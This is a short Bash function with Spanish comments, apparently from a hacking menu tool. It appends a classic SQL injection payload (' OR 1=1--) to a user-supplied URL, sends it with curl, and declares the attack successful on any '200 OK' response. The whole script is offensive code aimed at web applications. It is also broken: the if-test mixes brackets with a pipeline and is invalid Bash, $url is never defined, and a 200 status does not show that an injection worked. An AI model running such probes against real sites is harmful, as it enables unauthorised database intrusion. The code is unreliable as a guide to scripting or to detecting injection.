#!/bin/bash
sqli() {
#preparamos las variables
URL=$(echo -e "$url")
SQLi="%27+OR+1=1--"
ATTACK="$URL$SQLi"
#si el ataque funciona
if [ curl -i "$ATTACK" | grep "200 OK" ]
then
#muestrame por pantalla una url con el resultado
  echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
else
#si no funciona muestra este mensaje de error y cierra el programa
  echo "Disculpa, el ataque no ha funcionado."
  'volvermenu'
fi
}
